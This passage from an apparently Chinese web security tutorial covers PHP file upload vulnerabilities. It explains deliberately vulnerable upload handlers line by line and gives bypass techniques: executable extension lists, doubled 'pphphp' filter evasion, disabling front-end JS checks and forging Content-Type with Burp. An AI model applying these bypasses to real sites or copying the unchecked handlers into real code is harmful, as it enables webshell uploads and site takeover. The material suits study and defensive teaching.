class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="客户端文件上传的代码"><a href="#客户端文件上传的代码" class="headerlink" title="客户端文件上传的代码"></a>客户端文件上传的代码</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文件上传代码"><a href="#文件上传代码" class="headerlink" title="文件上传代码"></a>文件上传代码</h3><p>文件上传时会返回一些代码，返回客户端，客户端根据这些值判断上传是否正常：</p><ul><li>值：0; 没有错误发生，文件上传成功。</li><li>值：1; 上传的文件超过了 <code>php.ini</code> 中 <code>upload_max_filesize</code> 选项限制的值。</li><li>值：2; 上传文件的大小超过了 HTML 表单中 <code>MAX_FILE_SIZE</code> 选项指定的值。</li><li>值：3; 文件只有部分被上传。</li><li>值：4; 没有文件被上传。</li></ul><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>文件上传漏洞分为以下几种：</p><ul><li><strong>直接文件上传</strong>：这种漏洞属于高危漏洞，攻击者可以直接通过上传点获取网站控制权限，没有任何限制。</li><li><strong>有条件限制的上传漏洞</strong>：这种漏洞通常是由于开发者经验不足，对文件上传做了简单限制，如前端认证、文件头检测等，这些限制可以被绕过。</li><li><strong>权限认证问题</strong>：没有对文件上传页面进行权限认证，匿名用户可以访问上传功能，上传后门到网站目录，从而控制整个网站。</li><li><strong>上传逻辑问题</strong>：文件上传逻辑存在缺陷，导致攻击者可以绕过限制，上传后门到网站上。</li><li><strong>中间件或系统特性利用</strong>：通过中间件或系统特性，攻击者可以上传可被服务器解析的脚本文件，从而控制网站。</li></ul><h2 id="文件上传漏洞的修复方案"><a href="#文件上传漏洞的修复方案" class="headerlink" title="文件上传漏洞的修复方案"></a>文件上传漏洞的修复方案</h2><ul><li><p>在网站中需要存在上传模块，需要做好权限认证，不能让匿名用户可访问。</p></li><li><p>文件上传目录设置为禁止脚本文件执行。这样设置即使被上传后门的动态脚本也不能解析，导致攻击者放弃这个攻击途径。</p></li><li><p>设置上传白名单，白名单只允许图片上传如，jpg png gif 其他文件均不允许上传</p></li><li><p>上传的后缀名，一定要设置成图片格式如 jpg png gif</p></li></ul><h1 id="2-4-文件上传的攻击方法"><a href="#2-4-文件上传的攻击方法" class="headerlink" title="2.4 文件上传的攻击方法"></a>2.4 文件上传的攻击方法</h1><p>寻找测试网站的文件上传的模块，常见 头像上传，修改上传，文件编辑器中文件上传，图片上传、媒体上传等，通过抓包上传恶意的文件进行测试，上传后缀名 asp php aspx 等的动态语言脚本，查看上传时的返回信息，判断是否能直接上传，如果不能直接上传，再进行测试上传突破，例如上传文件的时候只允许图片格式的后缀，但是修改文件时，却没有限制后缀名，图片文件可以修改成动态语言格式如 php，则可能访问这个文件的 URL 直接 getshell，可以控制网站</p><h1 id="2-5文件上传漏洞"><a href="#2-5文件上传漏洞" class="headerlink" title="2.5文件上传漏洞"></a>2.5文件上传漏洞</h1><h2 id="2-5-1-常见的网站文件后缀名"><a href="#2-5-1-常见的网站文件后缀名" class="headerlink" title="2.5.1 常见的网站文件后缀名"></a>2.5.1 常见的网站文件后缀名</h2><p>可执行脚本的文件后缀名，可被网站目录解析。以下是常见的后缀名</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">asp</span><br><span class="line"></span><br><span class="line">asa</span><br><span class="line"></span><br><span class="line">cdx</span><br><span class="line"></span><br><span class="line">cer</span><br><span class="line"></span><br><span class="line">aspx</span><br><span class="line"></span><br><span class="line">ashx</span><br><span class="line"></span><br><span class="line"><span class="keyword">jsp</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">php</span><br><span class="line"></span><br><span class="line">php3</span><br><span class="line"></span><br><span class="line">php.a</span><br><span class="line"></span><br><span class="line"><span class="keyword">shtml</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">phtml</span><br></pre></td></tr></table></figure><p>有些网站会对 asp 或者 php 进行过滤转成空可用这些后缀名。</p><p><code>aspasp asaspp</code></p><p><code>pphphp</code></p><h2 id="2-5-2-任意文件上传漏洞"><a href="#2-5-2-任意文件上传漏洞" class="headerlink" title="2.5.2 任意文件上传漏洞"></a>2.5.2 任意文件上传漏洞</h2><p>任意文件上传漏洞又名文件直接上传漏洞 这种漏洞危害极大，如果攻击者能直接上传恶意脚本到网站存放的目录，<strong>且这个目录可解析动态脚本语言</strong>，那么攻击者就能够直接获取网站权限，甚至进一步权限提升，控制服务器</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;`</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;`</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;`</span><br><span class="line">    <span class="variable">$upload_dir</span> = <span class="string">&quot;uploads/&quot;</span>;`</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);`</span><br><span class="line">    <span class="variable">$target_file</span> = <span class="variable">$upload_dir</span> . <span class="variable">$file_name</span>;`</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;`</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_name</span>) . <span class="string">&quot; has been uploaded.&quot;</span>;`</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;`</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;`</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">这段 PHP 代码实现了一个简单的文件上传功能。它接收用户上传的文件，并尝试将其存储到服务器的指定目录中。以下是对代码的逐行解释：</span><br><span class="line"></span><br><span class="line"><span class="comment">### 代码解释</span></span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br></pre></td></tr></table></figure><ul><li>**<code>&lt;?php</code>**：PHP 脚本的开始标记，表示以下内容是 PHP 代码。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;</span><br></pre></td></tr></table></figure><ul><li>**<code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code>**：<code>$_FILES</code> 是一个超全局数组，用于存储文件上传的相关信息。<code>&quot;file&quot;</code> 是表单中文件输入字段的名称（<code>&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</code>）。<code>&quot;error&quot;</code> 是一个错误代码，表示文件上传过程中是否发生错误。</li><li>**<code>if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</code>**：检查文件上传是否出错。如果 <code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code> 的值大于 0，表示上传过程中发生了错误。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>**<code>echo</code>**：输出字符串。</li><li>**<code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code>**：输出错误代码。</li><li>**<code>&lt;br&gt;</code>**：HTML 标签，表示换行。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure><ul><li>如果文件上传没有错误，执行以下代码。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$upload_dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>**<code>$upload_dir</code>**：定义文件上传的目标目录。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br></pre></td></tr></table></figure><ul><li>**<code>$_FILES[&quot;file&quot;][&quot;name&quot;]</code>**：用户上传的文件名。</li><li>**<code>basename()</code>**：函数用于获取文件名的基名（即去掉路径部分）。例如，如果用户上传的文件名是 <code>path/to/file.jpg</code>，<code>basename()</code> 会返回 <code>file.jpg</code>。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$target_file</span> = <span class="variable">$upload_dir</span> . <span class="variable">$file_name</span>;</span><br></pre></td></tr></table></figure><ul><li>**<code>$target_file</code>**：目标文件的完整路径，由上传目录和文件名拼接而成。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br></pre></td></tr></table></figure><ul><li>**<code>$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]</code>**：文件上传到服务器后存储的临时文件路径。</li><li>**<code>move_uploaded_file()</code>**：函数用于将上传的文件从临时目录移动到指定的目标路径。</li><li>**<code>if (move_uploaded_file(...))</code>**：检查文件是否成功移动到目标路径。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_name</span>) . <span class="string">&quot; has been uploaded.&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>**<code>htmlspecialchars()</code>**：函数用于将特殊字符转换为 HTML 实体，防止 XSS 攻击。</li><li>输出文件上传成功的消息。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure><ul><li>如果文件移动失败，执行以下代码。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>输出文件上传失败的消息。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>**<code>?&gt;</code>**：PHP 脚本的结束标记。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这段代码实现了一个简单的文件上传功能：</p><ol><li>检查文件上传是否出错。</li><li>如果没有错误，将文件从临时目录移动到指定的目标目录。</li><li>输出文件上传成功或失败的消息。</li></ol><h2 id="2-5-3-绕过js前端检测上传"><a href="#2-5-3-绕过js前端检测上传" class="headerlink" title="2.5.3 绕过js前端检测上传"></a>2.5.3 绕过js前端检测上传</h2><h3 id="js绕过方法"><a href="#js绕过方法" class="headerlink" title="js绕过方法"></a>js绕过方法</h3><p>按 F12 使用网页审计元素，把<strong>校验的上传文件后缀名文件删除（或在浏览器禁用js）</strong>，即可上传。<br>把恶意文件改成 js 允许上传的文件后缀，如 jpg、gif、png 等，<strong>再通过burpsuite抓取 post 的数据包，把后缀名改成可执行的脚本后缀如 php 、asp、jsp、net 等</strong>。即可绕过上传。删除 js 文件</p><p>抓包修改后缀名</p><h3 id="js前端检测原理"><a href="#js前端检测原理" class="headerlink" title="js前端检测原理"></a>js前端检测原理</h3><p>在文件上传时，用户选择文件时，或者提交时，有些<strong>网站会对前端文件名进行验证</strong>，一般检测后缀名，是否为上传的格式。如果上传的格式不对，则弹出提示文字。此时<strong>数据包并没有提交到服务器</strong>，只是在客户端通过 js 文件进行校验，验证不通过则不会提交到服务器进行处理。</p><h3 id="js前端检测代码分析"><a href="#js前端检测代码分析" class="headerlink" title="js前端检测代码分析"></a>js前端检测代码分析</h3><p>客户段 html 上传文件时会调用 <strong>checkFile 函数</strong>，首先获取文件后缀名。如果文件为空，则弹出“请选择要上传的文件”，如果文件不为空，获取上传的文件后缀名不 .jpg、.png 、.gif 其中一种则提示“该文<br>件不允许上传”，上传失败。</p><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">`&lt;in put type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upload_file&quot;</span> id=<span class="string">&quot;fileInput&quot;</span>&gt;`</span><br><span class="line">`&lt;button onclick=<span class="string">&quot;checkFile()&quot;</span>&gt;Check File&lt;/button&gt;`</span><br><span class="line">`&lt;script&gt;`</span><br><span class="line">`function checkFile() &#123;`</span><br><span class="line">    `// 获取文件输入框的值`</span><br><span class="line">    `var file = document.getElementById(&#x27;fileInput&#x27;).value<span class="comment">;`</span></span><br><span class="line">    `if (file == null || file == <span class="string">&quot;&quot;</span>) &#123;`</span><br><span class="line">        `alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>)<span class="comment">;`</span></span><br><span class="line">        `return <span class="literal">false</span><span class="comment">;`</span></span><br><span class="line">    `&#125;`</span><br><span class="line"></span><br><span class="line">    `// 定义允许上传的文件类型`</span><br><span class="line">    `var allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span><span class="comment">;`</span></span><br><span class="line">    `// 提取上传文件的类型`</span><br><span class="line">    `var ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>))<span class="comment">;`</span></span><br><span class="line">    `// 判断上传文件类型是否允许上传`</span><br><span class="line">    `if (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;`</span><br><span class="line">        `var errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name<span class="comment">;`</span></span><br><span class="line">        `alert(errMsg)<span class="comment">;`</span></span><br><span class="line">        `return <span class="literal">false</span><span class="comment">;`</span></span><br><span class="line">    `&#125;`</span><br><span class="line"></span><br><span class="line">    `// 如果文件类型验证通过，返回 <span class="literal">true</span>`</span><br><span class="line">    `return <span class="literal">true</span><span class="comment">;`</span></span><br><span class="line">`&#125;`</span><br><span class="line">`&lt;/script&gt;`</span><br></pre></td></tr></table></figure><hr><p>这段代码是一个简单的HTML和JavaScript实现的文件上传验证功能。它的主要作用是检查用户选择的文件是否符合允许上传的文件类型（如<code>.jpg</code>、<code>.png</code>、<code>.gif</code>）。以下是代码的详细解释，包括HTML和JavaScript部分的语法和逻辑。</p><h3 id="HTML部分"><a href="#HTML部分" class="headerlink" title="HTML部分"></a>HTML部分</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;checkFile()&quot;</span>&gt;</span>Check File<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title="&lt;input type=&quot;file&quot;&gt;"></a><code>&lt;input type=&quot;file&quot;&gt;</code></h4><ul><li>**<code>&lt;input&gt;</code>**：HTML表单元素，用于创建输入字段。</li><li>**<code>type=&quot;file&quot;</code>**：指定输入字段的类型为文件选择器，用户可以通过它选择本地文件。</li><li>**<code>name=&quot;upload_file&quot;</code>**：为输入字段指定一个名称，用于在表单提交时标识该字段。</li><li>**<code>id=&quot;fileInput&quot;</code>**：为输入字段指定一个唯一的ID，方便通过JavaScript获取该元素。</li></ul><h4 id="-1"><a href="#-1" class="headerlink" title="&lt;button onclick=&quot;checkFile()&quot;&gt;"></a><code>&lt;button onclick=&quot;checkFile()&quot;&gt;</code></h4><ul><li>**<code>&lt;button&gt;</code>**：HTML按钮元素，用于创建一个按钮。</li><li>**<code>onclick=&quot;checkFile()&quot;</code>**：为按钮添加一个点击事件处理器。当用户点击按钮时，会调用<code>checkFile()</code>函数。</li></ul><h3 id="JavaScript部分"><a href="#JavaScript部分" class="headerlink" title="JavaScript部分"></a>JavaScript部分</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 获取文件输入框的值</span></span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">// 提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">// 判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果文件类型验证通过，返回 true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-获取文件输入框的值"><a href="#1-获取文件输入框的值" class="headerlink" title="1. 获取文件输入框的值"></a>1. 获取文件输入框的值</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>).<span class="property">value</span>;</span><br></pre></td></tr></table></figure><ul><li>**<code>document.getElementById(&#39;fileInput&#39;)</code>**：通过ID获取<code>&lt;input type=&quot;file&quot;&gt;</code>元素。</li><li>**<code>.value</code>**：获取用户选择的文件路径（在某些浏览器中，可能只返回文件名）。</li><li>**<code>var file</code>**：将获取到的值存储在变量<code>file</code>中。</li></ul><h4 id="2-检查是否选择了文件"><a href="#2-检查是否选择了文件" class="headerlink" title="2. 检查是否选择了文件"></a>2. 检查是否选择了文件</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>**<code>file == null || file == &quot;&quot;</code>**：检查<code>file</code>是否为空（用户未选择文件）。</li><li>**<code>alert(&quot;请选择要上传的文件!&quot;)</code>**：如果未选择文件，弹出提示框。</li><li>**<code>return false</code>**：返回<code>false</code>，表示验证失败，阻止后续操作。</li></ul><h4 id="3-定义允许上传的文件类型"><a href="#3-定义允许上传的文件类型" class="headerlink" title="3. 定义允许上传的文件类型"></a>3. 定义允许上传的文件类型</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>**<code>var allow_ext</code>**：定义一个字符串变量，存储允许上传的文件扩展名，用<code>|</code>分隔。</li></ul><h4 id="4-提取上传文件的扩展名"><a href="#4-提取上传文件的扩展名" class="headerlink" title="4. 提取上传文件的扩展名"></a>4. 提取上传文件的扩展名</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br></pre></td></tr></table></figure><ul><li>**<code>file.lastIndexOf(&quot;.&quot;)</code>**：找到文件名中最后一个<code>.</code>的位置。</li><li>**<code>file.substring(...)</code>**：从该位置开始截取字符串，提取文件扩展名（包括<code>.</code>）。</li><li>**<code>var ext_name</code>**：将提取到的扩展名存储在变量<code>ext_name</code>中。</li></ul><h4 id="5-判断文件类型是否允许上传"><a href="#5-判断文件类型是否允许上传" class="headerlink" title="5. 判断文件类型是否允许上传"></a>5. 判断文件类型是否允许上传</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">    <span class="title function_">alert</span>(errMsg);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>**<code>allow_ext.indexOf(ext_name + &quot;|&quot;)</code>**：在<code>allow_ext</code>字符串中查找<code>ext_name + &quot;|&quot;</code>（例如<code>.jpg|</code>）。如果找不到，返回<code>-1</code>。</li><li>**<code>var errMsg</code>**：定义错误信息，提示用户允许的文件类型和当前文件类型。</li><li>**<code>alert(errMsg)</code>**：弹出错误提示框。</li><li>**<code>return false</code>**：返回<code>false</code>，表示验证失败，阻止后续操作。</li></ul><h4 id="6-验证通过"><a href="#6-验证通过" class="headerlink" title="6. 验证通过"></a>6. 验证通过</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><ul><li>如果文件类型验证通过，返回<code>true</code>，表示验证成功，可以继续后续操作（例如提交表单）。</li></ul><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这段代码通过HTML和JavaScript实现了以下功能：</p><ol><li>用户通过<code>&lt;input type=&quot;file&quot;&gt;</code>选择文件。</li><li>点击按钮时，调用<code>checkFile()</code>函数。</li><li>检查是否选择了文件，如果没有选择，弹出提示并返回<code>false</code>。</li><li>提取文件扩展名，并检查是否在允许的文件类型列表中。</li><li>如果文件类型不符合要求，弹出错误提示并返回<code>false</code>。</li><li>如果验证通过，返回<code>true</code>，允许后续操作。</li></ol><p>这种验证方式主要用于前端用户体验优化，但需要注意的是，前端验证可以被绕过，因此在实际应用中还需要在服务器端进行严格的文件类型和安全性验证。</p><h2 id="2-5-4-绕过contnet-type-检测上传"><a href="#2-5-4-绕过contnet-type-检测上传" class="headerlink" title="2.5.4 绕过contnet-type 检测上传"></a>2.5.4 绕过contnet-type 检测上传</h2><h3 id="绕过contnet-type-检测方法"><a href="#绕过contnet-type-检测方法" class="headerlink" title="绕过contnet-type 检测方法"></a>绕过contnet-type 检测方法</h3><p>上传文件,脚本文件，抓包把 content-type 修改成 image&#x2F;jpeg 即可绕过上传。</p><h3 id="绕过contnet-type-检测原理"><a href="#绕过contnet-type-检测原理" class="headerlink" title="绕过contnet-type 检测原理"></a>绕过contnet-type 检测原理</h3><p>有些上传模块，会<strong>对 http 的类型头进行检测</strong>，如果是图片类型，允许上传文件到服务器，否则返回上传失败。因为<strong>服务端是通过 content-type 判断类型</strong>，content-type 在客户端可被修改。则此文件上传也有可能被绕过的风险。</p><h3 id="分析contnet-type-代码漏洞"><a href="#分析contnet-type-代码漏洞" class="headerlink" title="分析contnet-type 代码漏洞"></a>分析contnet-type 代码漏洞</h3><p>首先进行 submit 提交判断，再检测文件类型如果是 image&#x2F;jpeg 或者 image&#x2F;png<br>即允许上传。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``````</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span 